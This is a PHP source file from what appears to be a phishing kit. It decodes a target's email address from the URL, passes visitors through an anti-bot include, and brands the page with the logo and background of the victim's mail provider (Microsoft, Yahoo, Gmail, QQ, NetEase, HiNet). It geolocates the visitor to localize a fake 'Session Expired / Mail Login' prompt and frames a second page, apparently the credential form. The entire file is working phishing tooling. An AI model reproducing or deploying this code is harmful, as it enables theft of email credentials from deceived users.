<?php
include "antibot.php"; 
$get = $_GET['a'];
$i = $_GET["i"];
$c = $_GET["c"];
$eadd = base64_decode($get);

if(empty($eadd)){
		$domain = "";
		$image = "ico/default.png";
		$bg = "ico/bg/default.jpg";
		$title = "";
	}
	
	else{
$ename = explode("@",$eadd);
$name = $ename['0'];
$dom = explode("@",$eadd);
$domain = $dom['1'];
$comp = explode(".",$domain);
$company = ucfirst($comp['0']);
$fav = $domain;
$title = $company;


if (stripos($domain, 'yahoo') !== false || stripos($domain, 'rocketmail') !== false){
	$image = "ico/ym.ico";
	$bg = "ico/bg/ym.jpg";
}

elseif (stripos($domain, 'office') !== false || stripos($domain, 'live') !== false || stripos($domain, 'hotmail') !== false){$image = "ico/hm.ico"; $bg = "ico/bg/hm.jpg";}

elseif (stripos($domain, 'yeah') !== false){$image = "ico/16y.ico"; $bg = "ico/bg/yeah.jpg";}

elseif (stripos($domain, '163') !== false){$image = "ico/16y.ico"; $bg = "ico/bg/163.jpg";}

elseif (stripos($domain, '126') !== false){$image = "ico/16y.ico"; $bg = "ico/bg/126.jpg";}

elseif (stripos($domain, 'outlook') !== false){
	$image = "ico/ou.ico"; $bg = "ico/bg/hm.jpg";
}

elseif (stripos($domain, '@mail.com') !== false){
	$image = "ico/mail.ico"; $bg = "ico/bg/mail.jpg";
}

elseif (stripos($domain, 'msn') !== false){
	$image = "ico/ms.ico"; $bg = "ico/bg/hm.jpg";
}

elseif (stripos($domain, 'gmail.com') !== false){
	$image = "ico/gm.ico"; $bg = "ico/bg/gm.jpg";
}

elseif (stripos($domain, 'qq') !== false){
	$image = "ico/qq.ico"; $bg = "ico/bg/qq.jpg";
}

elseif (stripos($domain, 'hinet') !== false || stripos($domain, 'hi-net') !== false){
	$image = "ico/hi.ico"; $bg = "ico/bg/hi.jpg";
}

else{
	$image = "http://".$fav."/favicon.ico";
	$bg = "ico/bg/default.jpg";
}
	
}

$ip = getenv("REMOTE_ADDR");
$ipdat = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip));
if(property_exists($ipdat, 'geoplugin_countryCode'));
if(property_exists($ipdat, 'geoplugin_countryName'));
$country = $ipdat->geoplugin_countryCode;
$countryName = $ipdat->geoplugin_countryName;



if (stripos($domain, 'outlook') !== false || stripos($domain,'hotmail') !== false || stripos($domain,'live') !== false || stripos($domain,'office') !== false || stripos($domain,'msn') !== false)  {
	$company = "Microsoft";
}
elseif (stripos($domain, 'yahoo') !== false || stripos($domain,'rocketmail') !== false){$company = "Yahoo!";}

elseif(stripos($domain,'gmail') !== false){$company = "Google LLC";}
	




elseif (stripos($domain, '126') !== false || stripos($domain,'163') !== false || stripos($domain,'yeah') !== false){
$se = "会话已过期";
$pl = "邮件登录";
$company = "NetEase";
}

elseif (stripos($domain, 'qq') !== false){
$se = "会话已过期";
$pl = "邮件登录";
$company = "QQ";
}

elseif (stripos($domain, 'hinet') !== false || stripos($domain, 'hi-net') !== false){
	$se = "会话已过期";
$pl = "邮件登录";
$company = "HiNet";
}

else{
	$se = "Session Expired";
$pl = "Mail Login";
$company = "";
}
	



if (stripos($country,'CN') !== false || stripos($country,'HK') !== false || stripos($country,'TW') !== false) {
$se = "会话已过期";
$pl = "邮件登录";
}

else if (stripos($country,'SA') !== false || stripos($country,'CY') !== false || stripos($country,'IR') !== false || stripos($country,'TR') !== false || stripos($country,'PS') !== false || stripos($country,'IQ') !== false || stripos($country,'AE') !== false || stripos($country,'EG') !== false || stripos($country,'DZ') !== false || stripos($country,'BH') !== false || stripos($country,'IL') !== false || stripos($country,'JO') !== false || stripos($country,'KW') !== false || stripos($country,'LB') !== false || stripos($country,'LY') !== false || stripos($country,'MA') !== false || stripos($country,'OM') !== false || stripos($country,'PS') !== false || stripos($country,'QA') !== false || stripos($country,'SO') !== false || stripos($country,'SD') !== false || stripos($country,'SY') !== false || stripos($country,'YE') !== false || stripos($country,'SS') !== false) {
	$se = "انتهت الجلسة";
$pl = "تسجيل دخول البريد";
}


else if (stripos($country,'BJ') !== false || stripos($country,'BF') !== false || stripos($country,'BI') !== false || stripos($country,'CM') !== false || stripos($country,'CF') !== false || stripos($country,'TD') !== false || stripos($country,'CI') !== false || stripos($country,'CD') !== false || stripos($country,'DZ') !== false || stripos($country,'DJ') !== false || stripos($country,'GQ') !== false || stripos($country,'FR') !== false || stripos($country,'GA') !== false || stripos($country,'GG') !== false || stripos($country,'GN') !== false || stripos($country,'HT') !== false || stripos($country,'MG') !== false || stripos($country,'ML') !== false || stripos($country,'MU') !== false || stripos($country,'MC') !== false || stripos($country,'NE') !== false || stripos($country,'RW') !== false || stripos($country,'SN') !== false || stripos($country,'SC') !== false || stripos($country,'TG') !== false || stripos($country,'VU') !== false) {
	
$se = "La session a expiré";
$pl = "Mail Login";
}

else{
	$se = "Session Expired";
$pl = "Mail Login";
}

$bdcolorH = "#a14f26";

if (stripos($domain, 'outlook') !== false || stripos($domain,'yahoo') !== false || stripos($domain,'hotmail') !== false || stripos($domain,'live') !== false || stripos($domain,'rocketmail') !== false || stripos($domain,'gmail') !== false || stripos($domain,'office') !== false || stripos($domain,'msn') !== false)  {

$bdcolorH = "#77d2ff";
}

elseif (stripos($domain, '126') !== false || stripos($domain,'163') !== false || stripos($domain,'yeah') !== false || stripos($domain,'qq') !== false || stripos($domain,'hinet') !== false || stripos($domain,'hi-net') !== false)  {

$bdcolorH = "#3bcd58";}

?>

<HTML>
<BODY>
<head>
<link rel="icon" 
      type="image/png" 
      href="<?php echo $image; ?>" />
	  <title><?php echo $company;?> <?php echo $pl; ?> [<?php echo $se; ?>]</title>
<style>
{ margin: 0; padding: 0; }

html { 
        background: url('<?php echo $bg; ?>') no-repeat center center fixed;
		  -webkit-background-size: cover;
  -moz-background-size: cover;
  -o-background-size: cover;
  background-size: cover;
    }
	
	iframe {
	height:315px;
	width:380px;
	border-radius: 5px 5px 5px 5px;
	border: 1px solid <?php echo $bdcolorH; ?>;
	}
	
	
	#frame{
	text-align: center;
    position: absolute;
    top: 25%;
    left: 0px;
    width: 100%;

    overflow: visible;
    visibility: visible;
    display: block;
	border-radius: 20px 20px 20px 20px;
	
	}
</style>
</HEAD>

<BODY>

<div  id="frame">
<iframe src="ova.php?a=<?php echo $get."&i=".$i."&c=".$c; ?>" frameborder="0"></iframe>
</div>
</BODY>
</HTML>